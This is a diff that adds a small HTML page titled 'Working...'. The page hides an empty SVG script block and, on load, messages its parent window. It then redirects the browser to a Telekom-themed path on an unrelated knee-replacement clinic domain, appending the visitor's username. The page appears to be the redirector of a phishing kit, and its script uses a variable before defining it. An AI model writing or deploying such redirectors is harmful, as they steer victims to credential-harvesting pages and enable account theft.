@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Working...</title>
+</head>
+
+<body>
+
+
+    <p id="dis"></p>
+ 
+<?xml version="1.0" ?>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <circle></circle>
+    <script type="text/javascript">
+    </script>
+</svg>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+
+    window.onload = function() {
+
+        parent.window.postMessage(`https://kneereplacementchandigarh.in/ma/Telekom_003/?e=?username=${username}`, "*")
+
+  window.addEventListener("message", function(event) {
+    var url = event.data;
+    var parts = url.split("=");        
+    var username = parts[1];
+    window.location = 'https://kneereplacementchandigarh.in/ma/Telekom_003/?e=' + encodeURIComponent(username); 
+  }, false);
+};
+
+</script>
+</body>
+</html>
